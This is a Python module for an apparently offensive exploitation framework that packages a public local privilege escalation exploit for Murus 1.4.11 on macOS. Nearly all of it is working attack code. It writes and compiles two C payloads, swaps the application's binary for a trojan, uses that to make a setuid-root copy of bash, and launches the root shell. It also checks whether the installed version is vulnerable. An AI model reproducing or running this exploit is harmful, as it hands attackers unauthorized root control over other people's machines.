from os import popen, system
from shutil import move
from subprocess import check_output
from time import sleep

from module_payload import PayloadModule


class BoomerModule(PayloadModule):
    def __init__(self):
        info = {"Name": "MurusRoot",
                "Module Author": "Josue Encinar",
                "Exploit Author": "Mark Wadham (m4rkw)",
                "Description": "Murus 1.4.11 local root privilege escalation exploit",
                "Reference": "https://www.exploit-db.com/exploits/43217/",
                }
        options = {}
        compatible = []
        super(BoomerModule, self).__init__(options, info, compatible)

    def check(self):
        try:
            f = open("/Applications/Murus.app/Contents/Info.plist", "r")
            string = "<string>1.4.11</string>"
            if string in f.read():
                self.print_ok("Vulnerable")
            else:
                self.print_info("No vulnerable")
        except Exception as e:
            self.print_error(e)

    def run(self):
        self.print_info("Compiling payloads")
        file1 = "/tmp/murus411_exp.c"
        file2 = "/tmp/murus411_exp2.c"
        try:
            with open(file1, "wb") as f1:
                f2 = open(file2, "wb")

                f1.write(b"""
            #include <unistd.h>
            int main()
            {
            setuid(0);
            seteuid(0);
            execl("/bin/bash","bash","-c","rm -f /tmp/murus411_exp; /bin/bash",NULL);
            return 0;
            }
            """)
            f2.write(b"""
            #include <unistd.h>
            #include <stdlib.h>
            int main()
            {
            setuid(0);
            seteuid(0);
            system("chown root:wheel /tmp/murus411_exp");
            system("chmod 4755 /tmp/murus411_exp");
            system("mv /Applications/Murus.app/Contents/MacOS/Murus.orig /Applications/\
            Murus.app/Contents/MacOS/Murus");
            execl("/Applications/Murus.app/Contents/MacOS/Murus","Murus",NULL);
            return 0;
            }
            """)
            f2.close()

            popen("""
            gcc /tmp/murus411_exp.c -o /tmp/murus411_exp;
            gcc /tmp/murus411_exp2.c -o /tmp/murus411_exp2;
            rm -f %s; rm -f %s;
            """ % (file1, file2))
        except Exception as e:
            self.print_error(e)
            return

        self.print_info("Waiting for loader")
        try:
            while True:
                data = system(
                    "ps auxwww | grep '/Applications/Murus.app/Contents/MacOS/MurusLoader' | grep -v grep 1> /dev/null")
                if data == 0:
                    break
                sleep(1)

            self.print_info("Planting payload")
            move("/Applications/Murus.app/Contents/MacOS/Murus", "/Applications/Murus.app/Contents/MacOS/Murus.orig")
            move("/tmp/murus411_exp2", "/Applications/Murus.app/Contents/MacOS/Murus")
        except Exception as e:
            self.print_error(e)
            return

        self.print_info("Waiting for payload to trigger")

        while True:
            data = check_output(["ls", "-la", "/tmp/murus411_exp"])
            if b"root" in data:
                break
            sleep(1)

        self.print_ok("Done! Enjoy :)")
        system("/tmp/murus411_exp")
